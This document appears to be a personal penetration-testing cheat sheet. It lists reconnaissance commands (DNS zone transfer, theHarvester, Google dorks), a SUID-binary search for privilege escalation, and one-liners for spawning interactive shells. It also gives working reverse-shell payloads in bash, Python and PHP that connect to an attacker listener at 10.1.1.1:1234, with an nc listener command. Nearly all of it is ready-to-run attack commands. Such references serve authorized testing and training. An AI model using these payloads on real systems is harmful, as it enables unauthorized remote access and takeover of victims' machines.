# zone-transfere
```
dnsrecon -d example.com -a
```

# theharvester
To collect data from certain search engines
```
theharvester -d example.com -l 500 -b google,bing -f result.html
```
# google dork

site:example.com

cache:example.com

# find files permission for the current user

`find / -perm -u=s -type f 2>/dev/null`

# spawn tty

source https://netsec.ws/?p=337

`python -c 'import pty; pty.spawn("/bin/sh")'`

`echo os.system('/bin/bash')`

`/bin/sh -i`

`perl —e 'exec "/bin/sh";'`

`perl: exec "/bin/sh";`

`ruby: exec "/bin/sh"`

### lua:

`os.execute('/bin/sh')`

### (From within IRB)

`exec "/bin/sh"`

### (From within vi)

`:!bash`

### (From within vi)

`:set shell=/bin/bash:shell`

### (From within nmap)

`!sh`

# Reverse shell

source http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

On the Attacker machine, use nc to open the listening port

`nc -lvp 1234`

On the Vulnerbale Machine do one of the following depending on the programming language

### bash

`bash -i >& /dev/tcp/10.1.1.1/1234 0>&1`


### python

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.1.1.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'`


### php

`php -r '$sock=fsockopen("10.1.1.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
`
